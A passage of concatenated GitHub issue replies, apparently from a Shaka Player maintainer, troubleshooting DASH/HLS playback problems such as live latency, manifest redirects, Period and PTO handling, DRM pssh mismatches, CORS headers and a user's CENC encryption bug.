of the IOP.  I would also think that it is a stable feature since it has been pushed by DASH IF.\nAs for why it should implemented, because there is no other way to synchronize the client and server.  The DASH spec just says that it must be synchronized already, but doesn't specify how.  The IOP adds the UTCTiming element to allow clients and servers to synchronize the clocks.  This is really important for live streams since segment availability is based on the current wall-clock time.. https://nightly-dot-shaka-player-demo.appspot.com/demo/#asset=https://home.andreymal.org/dash_delay_test/dash/manifest.mpd;lang=en-US;build=uncompiled\nThe reason you are seeing a delay is because we are buffering.  If I play the stream on the nightly page, I see that the playhead is always at about -0:02, or 2 seconds behind the live edge.  So I would think we have a latency of about ~2s, but we are stuck buffering a lot.  Also note that I can push the playhead further forward by typing video.currentTime += 0.2 a few times.  So I can get smooth playback at about ~2.5s delta.\nThe reason we are buffering is because we don't know about the future segments.  Like I said in #1287, using SegmentList means we need to wait for a manifest update before we can learn about new segments.  We also have a 3 second minimum between manifest updates.  Using SegmentTemplate with duration will help a lot.  Without an example of SegmentTemplate it will be hard to diagnose why the other manifest would have a longer delay.. Your segments are 0.5 seconds, so there will likely be 1 or 2 off because of network delays and the time it takes for us to react to the new segment.  Is the encoder and the browser running on the same machine?  This could be caused by a very slight clock-sync difference.  Maybe you could look into FFmpeg's documentation or code and change the availabilityStartTime to a bit forward.   This controls where we think the live edge is.  By moving it forward from what it is set to now, you might be able to get the player to request those segments.  But I don't think there is any other settings you could change to get better.. I'm concerned that you are making a request to originalManifestUri, which may have changed or be expired now.  You are assuming that the manifest is unchanged, which may not always be true.  Plus, the app may need to set up authentication to make the manifest request but they may not be expecting it.\nMaybe a better plan would be to store the init (pssh) data in the offline manifest.  Then we can recreate the sessions using the original init data without needing to make a manifest request or having to load anything.  Unfortunately this will require changing the database a little and it would have to wait until #1248 is done.. #1248 is closed and we have finished the refactorings to Storage.  If you are still interested in this, please rebase and fix any style errors with our new style rules.\nAs for design, you could actually just keep the init data in Storage and update the ManifestConverter to not keep the init data if we already have offline sessions.  Then you just need to use ManifestDb.drmInfos to get the init data and use DrmEngine to delete the old sessions and request the new licences.  Finally you'll need to update the database with the new session IDs.. The problem is that we currently only support key rotation when there are no pssh data in the manifest.  See #1107 for some more info.  The way we support key rotation is by listening for encrypted events from the browser when it sees a pssh box in the media.  We use this to send the license request.  When the pssh data is in the manifest, we only use that and ignore encrypted events.  But right now, we don't look for new pssh data in the new Periods.  So when we get a new Period, we should look for new pssh data and handle them.. @TheJohnBowers This is scheduled for v2.5, which will be our next feature release.  We will be working on this soon, but no one is working on it right now.. This may be related to #1014.. @kchandran1029 We do not support Fairplay, it is being tracked in #382.  It will not appear in 2.4, but probably in 2.5.\n@pradeeprajr93 Does this answer all your questions?. We used to keep bandwidth estimates between loads, but some change broke that.  We should be keeping bandwidth estimates.  Also, we don't use the defaultBandwidthEstimate to seed the estimator, we only use it to select the first streams.  So once we have a \"good\" estimate, we will use that, which always starts out small.\nI notice that on my network the estimate starts off extremely small despite downloading every segment quickly.  Maybe the starting 0 value is affecting the average for a while?. The problem here seems to be that the manifest update goes to the original URL rather than the redirected one.  (I think) The DASH spec doesn't say anything about how to handle redirects, so there is no guidance on the correct way to handle this case.  Usually, a redirect is transparent to JavaScript; the browser will handle the redirect and won't even tell us the response wasn't from the original URL.  On some browsers we can use the responseURL property to detect a redirect, but it isn't supported on all browsers.  Since redirects are usually transparent, and 302 is a temporary redirect, I would think we should query the original URL.\nHowever, there is a correct way to do this in DASH.  There is a <Location> element that does just what you want.  It is a child if <MPD> and the body is a full URL where we should send all future manifest requests to.  It also acts as the base URL for segments.  So all you need to do is have your balancer give us a different URL in the <Location> for the first request and all future requests will be made to that URL.. No, all types of redirects are the same from our perspective.  In fact, when using XMLHttpRequest, we can't even determine the type of redirect that occurred; all we can determine is whether a redirect occurred at all.  Our logic is to always query the original manifest URL for updates, unless there is a <Location> element.. I am thinking that it will be too simplistic to throw a different error based on app vs key system restrictions.  There can be different variants that are restricted for different reasons and having different error codes would require us to pick which cases to favor and throw a not-so-accurate error message.\nHow about instead adding something to the data field of the error to indicate what the restrictions were?  So you could get error.data[0] and it might be something like:\njs\n{\n  hasAppRestricted: false,    // App-applied restrictions\n  hasMissingKeys: true,       // Don't have the required keys\n  hasOutputRestricted: true,  // Key system output restriction\n}\nThe above would indicate that some streams have output restricted and some don't have the required keys.  This would allow you to handle them separately and construct an accurate error message/response.. First, rewinding is not well supported.  For example, we still buffer forward when rewinding and we will clear the buffer as we seek outside the buffered range during the rewind.  There are a few things we could do to make it better, but it is a lower priority feature.\nSecond, our gap jumping only works for playback, it doesn't work for rewinding.  Rewinding isn't playing, the video is just paused and repeatedly seeking backwards to simulate reverse playback.  Really, the video should be paused, so the gap jumping shouldn't be triggering at all.  It is a bug to try to jump gaps while rewinding.\nAlso, we aren't doubling the gapSize and trying it.  What is happening is we are moving backward, so the gap to the next (forward) content is getting larger.  I'm not sure why it would appear to double each time.  But again, gap jumping only works for playback, not rewinding.  We also can't always rely on the info in the manifest to be accurate.  There are frequently gaps in the media that don't appear in the manifest.  So we have to wait until we have downloaded the segments to determine where the gaps are.  But we don't \"poll and try\", we detect the buffered ranges of the video and seek to that.  When playing forward, our gap jumping will immediately and accurately detect the gap.. The original Period end is not available.  When we parse the manifest, we extend our Period to fill the gap and when we append the segments, there will be a gap that we will jump.  Note that this extending will not introduce new segments, we'll just extend the duration of the last segment to fill the gap.\nThink of it this way, you have two segments: [0-1] and [3-4].  We extend the duration of the first so there are no gaps, so we think the segments are [0-3] and [3-4].  When we append the first segment, it only fills [0-1], when we append the second segment, [0-1, 3-4] is filled, so we detect the gap and jump it if needed.. That error looks like a decoder error, which there is usually nothing we can do about.  This is likely a bug in Firefox or with your content.  I would also suggest filing a bug on: https://bugzilla.mozilla.org/.  But we can still look at it if you want.. I have a little experience with the Web Audio API, but we don't use it in Shaka Player.  I know that it is possible to do with Shaka Player as I have used it to create a visualizer. My guess is this is a problem with your app.  Maybe this is getting called twice and the second one is failing?  Or maybe you are using another library that is binding to the element?. Once you create the source object, the audio output is detached from the audio device.  You'll need to attach the source to something to be able to hear the audio again.  For example, if you wanted to put an analyser between the <video> and the audio device:\njs\nlet analyser = this.context.createAnalyser();\n// The <audio> should output to the analyser.\nthis.source.connect(analyser);\n// The analyser should output to the audio device.\nanalyser.connect(this.context.destination);. I don't think we should play the last segment to the end, we should truncate the last segment based on the Period duration (or the start of the next Period).  Could you post an example manifest where this happens?\nWhat we (should) do is truncate the last segment at the Period boundary and then append the segments from the next Period.  We use MSE's appendWindowEnd to tell the browser to drop any frames that appear after the Period.  It should provide a gap-free transition.  The end of a Period is usually easy to handle; what can be more complicated is how to handle the next Period.  If you return from the ad and want to play that partial segment as part of a new Period, there will be problems.\nIf you use presentationTimeOffset to make the first segment appear before the Period start, it will cause playback problems in the browser.  When we append segments we use appendWindowStart to cut off anything the appears before the Period start.  This ensures that any new content doesn't override the existing content.  However, this causes a problem since when removing content, the browser will remove up to the next keyframe.  So if the first keyframe is right before the Period start, we may \"lose\" the whole segment since the browser will remove to the next keyframe.\nSo it is important to have the first segment start after the Period start.  But ending with a partial segment should be fine.. > > So it is important to have the first segment start after the Period start\n\nI assume I can read this as \"on or after\"?\n\nYes.\nWere you able to find any content that reproduces the problem?  Do you have any other questions?. From the files you provided, the one that won't play has an incorrect pssh box in the manifest.  The <cenc:pssh> element contains a base-64 encoded pssh box that contains initialization data sent to the CDM.  In the asset that doesn't work, the key ID in the pssh box doesn't match what is encoded in the media.  If I go to chrome://media-internals, I can see the browser is blocked waiting for a key, but since the pssh contained the wrong key ID, the browser will wait forever.  It also looks like the pssh box in the media is correct, so it looks like the value in the manifest is the only thing that's wrong.\nWhatever is generating the manifest needs to ensure the key ID and pssh in the manifest  match the key ID in the media itself.  Another option might be to set the following config value, which will ignore the pssh in the manifest:\njs\nplayer.configure({manifest: {dash: {ignoreDrmInfo: true}}});. Usually decoder errors are outside our control.  Either the browser can play the content or it can't.  These kinds of errors are either bad content or browser limitations.  I can play the stream fine on Linux, but get errors on Mac and Windows.  Both those platforms use hardware decoders.  If I disable hardware decode in Chrome, the stream plays fine.  What is likely happening is the hardware decoders are more strict than Chrome's software decoders.  The only thing that can be done is to change your content to be playable (I have no insight on how to do this).\nSome notes: you can go to chrome://media-internals to see a list of the current video players to get better logs.  From there I see two logs that are important.\n\nPrepared video sample is not conformant\n\nThough it doesn't tell how, and\n\nWarning: presentation time of most recently processed random access point (55548.6 s) is later than the presentation time of a non-keyframe (55548.5 s) that depends on it. This type of random access point is not well supported by MSE; buffered range reporting may be less precise.. I cannot reproduce any problem with the manifest you provided in either the nightly or on v2.3.3. I am also able to play the Sintel demo asset at 1080p just fine (4k is getting decoder problems).  Can you try from the nightly demo page: https://bit.ly/2HbtCbp.\nI've confirmed the issue is reproducible with the snapshot manifest I grabbed\n\nHow?  I needed to manually alter the start time to get the manifest to play.  Can you elaborate more on how you are reproducing this issue?\nAlso, in the \"Configuration\" section, there is a checkbox \"Log to screen\" that lets you easily see the logs.  Plus there is a drop-down menu to change the log level, increasing the log level to \"Verbose\" would probably help.  Alternatively, in a custom app you can use shaka.log.setLevel(shaka.log.Level.V1).. Yes, I was testing on the Xbox One.\nYour logs show that the browser isn't evicting the content when we tell it to.  Near the bottom, there are lines like buffer behind too large: [...] overflow=755.6861656 and evicted 755.6861656 seconds, but the next append will still try to evict 700+ seconds.  So either your segments are somehow much larger than you think, or the browser is not actually removing the data when we tell it to.  But that is not causing all the problems since we get a QuotaExceededError before that point.\nI won't be able to look at this today, but I'll look at it more tomorrow.. I got our device on the early access OS and can confirm that I get a QuotaExceededError when playing.  This is very likely a platform issue since we only have the same buffered when we get the error as when we start.  Plus if I load a new asset, I immediately get another QuotaExceededError, so this looks like a platform memory leak causing an OOM.  Would you like to file an issue with Edge or should we?  If you file an issue, please post a link here so we can follow.. I believe this is caused by 25971503f, which tries to ensure we don't update the manifest too often on bad connections.  Because the one manifest request takes so long while we are throttled, we think the network is slow and we delay how often we update the manifest.. There is no way to know how often we need to update the manifest.  Sometimes we can wait 20 seconds between updates, sometimes we need to update every 2 seconds.  That is why the minimumUpdatePeriod property exists.  But on slow devices/networks, we don't want to update too often.\nThat commit was only added in v2.3.5, so it couldn't be a problem in older versions.  I am seeing different behavior with different versions, can you confirm this is what you are seeing.\nRepro steps:\n1. Navigate to page.\n1. Click \"Load\"\n1. Wait a few seconds, then throttle network connection\n1. Wait 60 seconds\n1. Un-throttle connection\nIn v2.3.5 I am seeing the seek bar repeatedly jump back into the seek window while we are throttled.  Once we un-throttle, we start playing eventually, but then sometimes stall again.\nIn v2.3.3 and v2.3.4 I am seeing an initial seek to keep us in the seek window, but then we stay at the left of the seek window after that.  Then once we un-throttle the connection, there is a log of Ignoring large gap of XXX and the video buffers but doesn't play.  If I manually seek back into the seek window, the video plays fine.\nIn v2.3.2 I see us repeatedly seek back into the seek window and once we un-throttle, the video plays fine.\nIs this what you are seeing?. It was related to an internal bug report from Chromecast.  It refers to changes 173ff9fbfffbc04fe1e1b7b4cc27e2d1b38f7508, fd57fedaab3094a25e30cdb8d76a40bfb1be5719, and partially to 9ce68c8e305259c645815b6c7c8d9acf860fbfb6.. This appears to be caused by 554cffc.  The problem is that we are using the PTO twice since it is in both the timestampOffset and in the segment times.. Actually, thinking about this more, this is the intended behavior.  The PTO should affect the media times as well as the S@t attribute.  So in that asset, the cue times in the segment start at 0, but are then adjusted backward by the PTO, so the cues appear before the real segment and are dropped.\nSee #1164 (comment) for some test assets that use PTO and multi-Period text.. In v2.2.9 we started adding the Period start to the values passed to appendBuffer as a fix for #1164.  Then in v2.3.3 we stopped and used the timestampOffset (Period start - PTO) in TextEngine as a fix for #1232.  But note that appendBuffer only uses those times  for text streams.  So we always have used PTO on audio/video segments, but we have had varying support for PTO on text streams.. Each AdaptationSet can have different values for PTO, even each Representation can if they use different segments.  The problem with your manifest is it uses <SegmentTimeline>, so the S@t attribute will be adjusted by the PTO and we use that to determine where the segments are.  So if you just reset PTO to zero, the segments won't be at the correct time.\nOne possible solution would be to use $Number$ instead of $Time$, so you can change the PTO without changing the segment URLs.. First, there are CORS errors again, which makes it hard to test.  I also sometimes get 403 Forbidden errors from the segments.  But after disabling CORS I see INVALID_XML errors.  It looks like some of the text segments are missing a > in the XML header.\nAlso note that we, by default, don't stream text streams unless you enable the text tracks.  This can be done in the demo by clicking the 'CC' button, but a custom app needs to call player.setTextTrackVisibility.. I would think you could just do the following:\n```js\nfunction drm_it(name, callback) {\n  it(name, async function() {\n    // Setup code.\nif (callback.length)\n  await new Promise((resolve) => callback(resolve));\nelse\n  await callback();\n\n});\n}\n```\nIf callback has a done callback, wrap it in a Promise.  Otherwise, if callback is async, it will return a Promise, which will get waited on.  If callback is synchronous, it will return undefined, which will do nothing in await.\n. Your explanation of AdaptationSet is slightly simplified.  There are also cases where the same content needs to be in different AdaptationSet elements.  For example, if you have both mp4 and webm content, or if HD and SD are encrypted with different keys.  They represent the \"same content\", but need to be in different AdaptationSet elements.  So there are cases where we need to adapt between two AdaptationSet elements.\nDASH has a something called \"adaptation set switching\", which is a property that tell us which sets we can switch between.  We should be using this to tell us which sets we can switch between; however, we currently just assume that we can switch between any of them so long as it doesn't change language, role, or channel count.  Take a look at #1071 to track the fix for this.. This was fixed as part of #1323, but that wasn't added to a v2.3.x release.  I've pulled the relevant parts of that commit into a cherry-pick onto the v2.3.x branch and it will appear in the v2.3.8 release.  This has already been fixed on master.. Do you actually have a receiver app deployed?  The APP ID specifies the receiver app to load on the Chromecast.  When you use the Shaka one, you are loading the Shaka demo's receiver app on the device.  If you change the APP ID, the value needs to be a receiver app that you have registered with Chromecast.\nI am not sure about our support for the default receiver app.\nIf you have a custom receiver app, you'll need to use Shaka on the receiver app as well.  You can look at the receiver_app.js file to see how our receiver works.  But you'll need to load Shaka on the receiver and use the shaka.cast.CastReceiver type to setup the Chromecast.\nIf you have a receiver app that uses Shaka already, could you send us a link to the source of the receiver so we can help debug more?. We have logic to retry after network failures.  If we detect some problem, we will retry up to a configurable amount.  Once we have hit that limit, we will raise an event on the Player object and stop.  If it is a live stream, we will, by default, continue retrying forever.  We assume that network errors in live streams are transient and will recover eventually.  But VOD content we assume doesn't change, so we won't retry forever.\nYou could fix this in your app by adding the following:\njs\nwindow.addEventListener('online', function() {\n  player.retryStreaming();\n});\nThat event is raised once the browser gets back online, then that method will cause us to restart streaming again.  But since this is a simple thing to do, we should do it for you.. We have little to no experience with the Web Audio API, so we can't really help much.  But you should be able to use a MediaElementAudioSourceNode to create a source object from the <video> element and then use that as part of cross-fading.  The fact that we are streaming into the <video> shouldn't make any difference.. > When playing HLS, Shaka will make a partial segment request using a Range header. I'm not familiar with the specific behaviour and reasons why (hopefully someone can comment).\nThere are two reasons we do Range requests.  First, we do it as part of manifest parsing to determine the start time of the first segment (since the HLS manifest doesn't tell us).  We fall back to a full segment request, so supporting Range headers isn't required in this case.  Second, we do Range headers whenever an HLS segment includes a byte range.  This indicates that the segment is part of a larger file, so we need to send the Range header so we get only that specific data.  Even if the byte range specifies the whole file, we have no way of determining that; so if we see a byte range on a segment, we need to set the header.\n@sergioavazquez There is usually nothing we can do about the 3014/3016 errors (which are decoder errors) and the Range header errors because these are requirements from the browser.  The browser rejects the media or the network request.  Some players can play on Safari because they just set src= and the native HLS player doesn't have those limitations.\nAs for why we don't support the media playlists (error 4022), we need the codec information provided in the master playlist.  If we don't have it, we could guess the codec as being multiplexed H264+AAC; but if we are wrong, we won't be able to play the content and will get a 3014/3016 error later.   (this is a requirement of the browser)\n@kchandran1029 I am able to play that asset fine on Safari.  Are you using the hosted demo or a custom app?  What errors are you seeing?. We need to know what codec the media is to be able to play the content.  If we don't set the correct codec when we initialize MediaSource, we'll get an error from the browser later.  That is what happens in the RADIO asset you listed above; we assumed it was h264+aac and it was just aac.  That is also why we need the master playlist, which usually has codec info in it (but some manifests don't).\nOn the other hand, we already make a segment request to determine the start time.  So it may be somewhat easy to pull the codec from the container also.  That would also allow us to play media playlists since (I think) codec info is the only thing that is required from the master playlist.\nI'll rename the issue and mark this an enhancement.  Tentatively scheduled for v2.5, but it may get pushed.\n@kchandran1029 If you are seeing errors, please post a new issue.. @chahatmiddha561 There is no option to disable this feature.  When we make a partial request for the first segment, we'll send the Range header to avoid downloading the whole segment; but if this fails, we will download the whole segment instead.  So not supporting Range requests shouldn't inhibit playback (in this case).. First, we don't support iOS at all since it doesn't support MediaSource.  We also do our own DASH and HLS parsing, we never pass it to the browser; this means we support them on all platforms equally.  So we either support DASH and HLS or don't support anything (assuming the default build).\nWhat you could do is use shaka.Player.isBrowserSupported to detect whether the browser is supported, then fall back to src=.  Note that you should always use isBrowserSupported before creating the Player to ensure the browser supports everything we need.\njs\nif (shaka.Player.isBrowserSupported()) {\n  let player = new shaka.Player(video);\n  player.load(dashManifest);\n} else {\n  video.src = 'foo.mp4';  // or 'foo.m3u8' on iOS/Mac.\n}. Here is some info from that internal report for outside people and if you (like me) forgot what the discussion was.\nThe last frame of the first Period ends 32 microseconds after the end of the Period, so the availabilityWindowEnd drops the last frame.  This causes a gap to appear in the buffered ranges, but the browser seems to play over it without stalling.  Because the browser doesn't fire a waiting event, our gap-jumping logic doesn't trigger to jump the gap.  Even though the browser plays through the gap, it stalls a few seconds later, and our stall-detection logic triggers and pushes things forward.\nThis has been fixed by Chrome's PTS fix, so once that isn't behind a flag, this problem will go away.  We could fix this by fudging the appendWindowEnd so the last frame isn't dropped.. First, NetworkingEngine should use every URI when doing retries.  Meaning the first request will be for the first URI, then the second request will be to the second URI, third request to the third URI (or back to the first if there are only two), etc.  If we aren't doing that, it is a bug (but I'm fairly sure it does work since we have a test).\nSecond, I think it would be easier to have you just catch the error from loading the manifest and do a second call to load with the other manifest.  Although this could be a useful feature, I think it has some confusing semantics.  DASH already supports fallback URIs, but they specify identical content, so it shouldn't matter which one we request.  But your use case seems different because it sounds like different content.\nSome questions about this design in general: How would it work with live (with later manifest requests)?  If the user passes two URIs and the first manifest request responds with the second URI, should we only request the second URI or still try the first URI?  How should this interact with 3XX redirects, which have been requested to keep to the redirect URI (#1367)?. I am concerned that this API could have some confusing semantics.  It may appear, without reading the documentation, that we would play them sequentially.  Also, should we use all the URIs forever (similar to DASH's logic) or should we stick to the first one that works?\nDASH's support for fallback URIs is for media segments.  By specifying multiple <BaseURL> elements, that means that a segment can be downloaded from more than one server.  This allows fallbacks for down servers.  This requires that each server hold the same segments so that it doesn't matter which server we query, we will still get the same media.\nDASH also supports xlink elements, which means making another request to a different URI to get a piece of the manifest.  For example, the first Period could contain regular content, but the second Period would be empty and contain an xlink that will be queried to get the real content.  This allows dynamic ad-insertion with a mostly-static manifest.  We support this case so long as it uses xlink:actuate=onLoad.  We also will fall-back to the content that is already in the Period if the request for that piece fails.  This could be used in your case.  For example:\nxml\n<Period duration=\"PT60S\">\n  <!-- Static content -->\n</Period>\n<Period duration=\"PT60S\" xlink:href=\"ad.mpd\">\n  <!-- Content to load if ad.mpd fails to load -->\n</Period>. The problem is that your manifest uses some XML namespace logic we don't support.  XML supports namespaces, but these namespaces can have different simple names but refer to the same thing.  Plus, you can specify the namespace in multiple ways.  For example, we look for an element <cenc:pssh> which contains the pssh box for the content.  But your manifest uses <pssh xmlns=\"urn:mpeg:cenc:2013\">, which I think is valid.  Your manifest also specifies xmlns:_=\"urn:mpeg:cenc:2013\" _:default_KID=\"foobar, which is basically giving the cenc namespace a different name.  We look for cenc:default_KID, rather than using more generic namespace resolution.\nSo a fix would be to generate the manifest without this namespace logic; but we should update our manifest parser to account for XML namespaces better.\nWe are also not getting an encrypted event from the browser that tell us the media is encrypted.  So we never make the license request.  It seems weird that the browser tries to play the content while it doesn't have the keys.. MediaKeys has been attached, and the media does include pssh boxes.  We also don't get a waitingforkey event.. Good news, I've looked into this more, and the XML fixes will be easy to add.  So I will add it to v2.4.\nBad news, your asset still won't play with the above fix due to an Edge bug.  It may be related to the bug you linked or to https://developer.microsoft.com/en-us/microsoft-edge/platform/issues/12658991/.  Basically Edge is choking because the first Period is \"fully\" clear and the second is encrypted with a clear lead.  For some reason, the encryption info in the second Period is being ignored and Edge thinks it is fully clear (hence the decoder problems).\nIf you start playback at 60 seconds, the content plays fine on the latest release, and we get the encrypted event as expected.  You can add startTime=60 to the URL to set the start time in the demo. \n I'll look into this more and probably file a bug on Edge.\nThe reason it works on Dash.js is because they reset MediaSource for each Period.  We don't do this to provide smooth playback, but Edge doesn't seem to play the content if we do this.. The XML namespace problem has been fixed.  But as I mentioned, your asset still won't play due to a bug in Edge.  I also noticed that Firefox doesn't play this as well, so I filed a bug on Firefox (https://bugzilla.mozilla.org/show_bug.cgi?id=1463213).  Filing a bug on Edge would be a bit harder since we don't have any easy-to-use PlayReady content to give as part of the repro.  But if you file a bug on Edge, please tell us about it so we can follow along.. First, response.headers is a \"simple\" JavaScript object, so it doesn't have a find method.  You could do something like:\njs\nconst cached = Object.keys(response.headers).indexOf('x-from-cache') >= 0;\nSecond, can you provide the source code for your service worker?  My guess is that the header isn't getting set or your are returning the old response (without the header) from the service worker.  We should support this case, you can read more in the service worker tutorial.\nThird, your first part about settings is presumably async since it uses then, so the code below it will run before the callback.  Meaning it will not stop the method if ok is falsy.  We do support async response filters, so you could have the function be async and use await.. I cannot reproduce any problem.  By editing our service worker I am able to add the header fine and it appears in the header object.  Are you sure the above code is being executed?  Are you sure the service worker is running and the correct version?  (I frequently have \"Bypass for network\" checked for testing)  You can check the Application tab of Chrome DevTools to see what the service worker is doing.\nCould you post a link to a hosted page that you can't get working?  You can send it privately to shaka-player-issues@google.com if you prefer.. First, I noticed your service worker had an error in the onfetch callback where url.hostname.contains causes an exception and the callback isn't invoked.  But after commenting out that block, I was able to see the problem.\nThe problem is that is a cross-origin request, so CORS rules apply.  Even though you are creating the response artificially in the service worker, you still need to follow CORS rules.  In this case, the X-From-Cache header isn't in the CORS allowed headers, so JavaScript can't access the header.  If I look at the XHR object and call xhr.getResponseHeader('x-from-cache'), I get an error saying Refusing to get unsafe header \"x-from-cache\".\nThe easiest fix would be to add a Access-Control-Allow-Headers: X-From-Cache header to your CDN so the header can be added in the service worker.  But I'm not sure how to fix this if you don't control the headers on the CDN.. I actually didn't test it... my bad.\nThe correct header is Access-Control-Expose-Headers: X-From-Cache.  I tested it by making a request to my local webserver using XHR and calling xhr.getResponseHeader on the result.  I didn't test with Shaka Player, but I am confident that this will work.. Are you trying to convert the live stream to VOD?  Is the whole stream available or just a portion of it?  If a new person tries to play the manifest after the stream has ended, how do you want them to see it?  Do you know how long the stream will be when it starts?  Does it work if you keep the minimumUpdatePeriod?\nHaving live streams end and convert to VOD is complicated.  We have a bug on the backlog to handle a similar case, #1055.. Does it play if you keep the minimumUpdatePeriod attribute in the manifest?\nWe don't currently support this and there are a few things that can cause problems with our current design.  First, I'm not sure how we would handle the availability window if the stream stopped, especially once the availability window becomes empty and none of the segments are available anymore.  Also, there is the question of \"what time do we start at?\"  Once we know the end of the live stream and someone starts playback, should we start near the end, near the beginning, somewhere in the middle?\nI'll put this on the backlog for now, but we may be considering this during our refactorings for v2.5.. First, you could use Shaka Packager to generate your content.  It takes UDP streams or files, supports Live and VOD, and supports clear-key and Widevine (and maybe PlayReady).\nI don't notice anything obviously wrong with the content or the code, but common encryption is hard to get right.  This is definitely not a Shaka Player issue and we can't offer official support.  But I have worked on common encryption a lot recently, so I can take a look at it a bit.\nWhat would really help would be a static media file before and after your encryption.  I don't notice anything wrong with the container data, but without the original, it will be nearly impossible to tell where the encryption is wrong.\nAlso, OpenSSL EVP supports CTR, so in your encrypt method, you could just use EVP_aes_128_ctr and avoid writing your own CTR encryption.  I would also highly advise checking the return value and w values to double-check it actually encrypted everything.. > 2. Having clear and encrypted media of the same fragment should be feasible, but this is not trivial.\nThe problem is that we are on live stream so, I have to patch my code to write both flavours. I was thinking of that from the beginning but the structure of the code does not make it simple.\nSo when done I can provide both init and fragment clear and encrypted.\nDoes your code not support VOD?  Couldn't you just tell it to encrypt some normal VOD clip and test with that instead?  Do you have access to the source live stream?  Since I assume your code isn't doing transcoding, all I really need is the codec data, which I could get out of the source TS stream.\nAlternatively, you could set up a live stream based on a VOD clip.  For example, this will stream the given MP4 file to a UDP stream, which could be picked up by your code.\n```bash\nffmpeg -re -i input.mp4 -f mpegts udp://127.0.0.1:1234\nOr using rtmp\nffmpeg -re -i input.mp4 -f flv rtmp:///live/myStream.sdp\n```\n\nthe fragment was unplayable BUT decrypting it with mp4decrypt from bento4 tool with the good kid:key gave me a correct fragment playable with vlc ! this is why I think I have not mode complete crap. On the other side MP4Box cannot decrypt it correctly ?!\n\nWhen I try to decrypt a segment with mp4decrypt, the decrypted segment is still unplayable for me.  I also can't decrypt it with FFmpeg.  For example, if I run:\nffmpeg -decryption_key F00DF00DF00DF00DF00DF00DF00DF00D -i input.mp4 out.mp4\nThis will print a bunch of errors in NAL unit size, which is consistent with badly encrypted content.  If I try to use FFmpeg to play the decrypted file, it gives the same errors.\n\n\nI did not make sub-sample encryption for video track for the moment. I know this is a Must in the spec but did that make a difference in the end ? I know that some packager (USP for example) did not that too, and content is playing.\n\n\nI'm not sure if Chrome supports full-sample encryption for this.  I know FFmpeg does, which is what I have been using for testing.  But you should add subsample encryption later so it will be playable on the most platforms.. First, you are using an older version of FFmpeg which incorrectly parses the encryption info.  I sent in patches to fix it recently and am using that version, which is why I can't get it to work for me.\nThe problem is you use the saio box to indicate where the encryption info is, but the value is wrong.  In older versions of FFmpeg, they didn't use this box, which is why it works in your FFmpeg and probably in mp4decrypt.\nThe number in the saio box is relative to the base offset defined in the tfhd (track-fragment header), which in your case is the moof.  In your case, it appears to be off by 24 bytes (at least in the segment I checked).. > I miss something but what ? where is the 24 bytes missing ?\nhttps://github.com/ut0mt8/nginx-rtmp-module/blob/cenc/dash/ngx_rtmp_mp4.c#L1422\nThat should use moof_pos, not pos, which is the traf position.. I can get it to play in Firefox.  My guess is Chrome doesn't support full-sample encryption.. There are specific rules for what bytes need to be encrypted vs clear when using subsample encryption.  Usually, decoders will just do what the container says and decode the bytes specified in the senc box, but Chrome may require you to follow those rules.\nFor example, in H.264/H.265, the data is written in a series of NAL units.  Only video-slice NAL units should be encrypted and then the NAL header and the H.264/H.265 header should be kept in the clear.  So if you want to follow the spec, you'll need to parse the NAL unit stream and the codec header to find which bytes to keep in the clear.  You can check out the implementation in Shaka Packager for reference.\nSo short answer: Chrome probably requires you to keep certain parts in the clear.\nIs there anything else you need help with?. Glad I could help.  If you have any more questions, feel free to ask.. chrome://media-internals reports the following logs:\n\nParsed video frame has DTS 88572646555us, which is after the frame's PTS 88572579822us\nWarning: presentation time of most recently processed random access point (7.54188 s) is later than the presentation time of a non-keyframe (7.47514 s) that depends on it. This type of random access point is not well supported by MSE; buffered range reporting may be less precise.\n\nIt looks like we seek to exactly the start of the buffered range, but the video doesn't move forward.  My guess would be the seek was inaccurate and caused the browser to stall.  These warnings should be fixed in your content.\nWe could introduce a fudge factor when we seek in gap jumping, but in your content, we would need to set it to at least 0.05 to work, which seems like a lot for a fudge factor.  It would be better to fix your content.. We will track these features in their original bugs, #1301 for pause/resume and #1347 for offline license renewal.. It seems like what you want is to store the video offline and then play that.  You can use our offline storage code to store the manifest offline then play the resulting offline manifest.\nAnother option would be to set the bufferBehind and bufferingGoal values to the length of the video; but this will only work for short videos.  If your video is an hour long, it is impossible for us to store the video in memory, so you'll have to store it offline.\njs\nplayer.configure({streaming: {bufferBehind: 600, bufferingGoal: 600}});. Could you post a link to a page that reproduces your problem?  I can loop a video by doing the following:\n\nNavigate to demo page (https://shaka-player-demo.appspot.com/demo/).\nOpen DevTools and type debugConfig = {streaming: {bufferBehind: 600, bufferingGoal: 600}}.\nClick Load with the Angel One (multicodec, multilingual) asset selected.\nRight click the video, select Loop.\n\nThe video will play and loop without downloading the content ever again.  You should be able to loop the video by setting the video's native loop value either in html with <video loop> or in JavaScript with video.loop = true.  If you call player.load() again, we will download the content again.\nIf you do want to use offline, then the trackSelectionCallback configuration value is what chooses which tracks to download.  It takes an array of all the tracks and should return an array of the tracks you want to store offline.. It looks like there is a small gap at the beginning of your content in the video stream.  We jump the gap automatically; but when we seek to the beginning, we think it is an unbuffered seek, so we clear the buffer.  We shouldn't be doing that.\nAs a work-around, you could manually set the seek range start, which will cause us to seek to that time when we loop and keep the buffer full.  player.configure({playRangeStart: 0.01}). @avelad What do you see us doing with this information?  It looks like what we would do is fire an event when we see that tag and let the app do something with it.. The Widevine license request and response formats are proprietary and undocumented.  Even if you knew the format, the response is signed with keys and certificates you don't have access to.  The CDM will only talk with official Widevine license servers.\nIf you want more information or would like to talk about hosting your own Widevine license server, you should talk with Widevine support directly: http://www.widevine.com/contact.html\nIf you are working offline, you could use our offline storage API to store the license while you are online and then play the content while you are offline.  But this requires being online to make the first license request.. I think it would be much easier with a self-contained repro.  Not having a license server makes repro-ing and fixing this hard.  So we'll probably be waiting until you send us a repro.  One thing you could try is removing this bit in the SegmentIndex.  I think it is causing duplicate index entries and confusing streaming.. I just pushed a change that will probably fix your issue.  Could you retry from master or with the latest nightly site?  https://nightly-dot-shaka-player-demo.appspot.com/demo/. Your stream is not setting availabilityStartTime correctly.  This time represents the wall-clock time that the presentation starts at (presentation time 0).  So when I fetched the manifest at 2018-06-20 19:40:52, the availabilityStartTime was 1970-01-01 00:00:00, so that makes the current presentation time 17702 days, 19:40:42.\nBut the segments don't align with that.  The segment list starts at 83890000000 and ends at 84010000000.  With a timescale of 10000000, that means the segments represent the presentation time range of 2:19:49 - 2:20:05.  So your segments are 17702 days in the past.\nYou need to update the availabilityStartTime to match the correct start time.  You could also use Period@start to do the same thing.  Note that after #999, we will be able to play this content; but your content is against the spec, so other players may not be able to play 